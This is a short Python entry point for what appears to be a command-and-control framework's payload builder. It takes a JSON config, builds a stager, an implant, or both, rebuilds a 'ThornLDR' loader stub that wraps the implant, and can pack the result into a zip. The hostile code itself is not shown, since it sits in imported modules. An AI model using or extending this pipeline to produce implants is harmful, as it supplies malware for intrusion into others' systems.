#!/usr/bin/env python3
"""Entry point for server-side builds invoked by the /api/build endpoint.

Usage:
    python3 builder/server_build.py --type all     --config '{"key":...}'
    python3 builder/server_build.py --type stager  --config '{"key":...}'
    python3 builder/server_build.py --type implant --config '{"key":...}'

Output goes to stdout/stderr and is captured by the Node.js parent process.
Exit code 0 = success, 1 = failure.
"""

import argparse
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from bab.build  import build_all, build_stager, build_implant
from bab.zip    import embed_in_zip
from bab.loader import rebuild_stub


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--type", required=True, choices=["all", "stager", "implant", "zip"])
    p.add_argument("--config", required=True, help="JSON build config")
    args = p.parse_args()

    cfg = json.loads(args.config)

    # Always rebuild the ThornLDR stub from the current loader source before
    # wrapping the implant.  The cached stub (tools/thornldr_stub.bin) may be
    # stale (e.g. from a previous session with debug code) and would silently
    # produce a broken blob.
    loader_features = cfg.get("loader_features") or None
    if args.type in ("all", "implant", "zip"):
        rebuild_stub(features=loader_features)

    if args.type == "all":
        success = build_all(cfg)
    elif args.type == "stager":
        success = build_stager(cfg)
    elif args.type == "implant":
        success = build_implant(cfg)
    else:  # zip
        success = build_all(cfg) and embed_in_zip(cfg)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
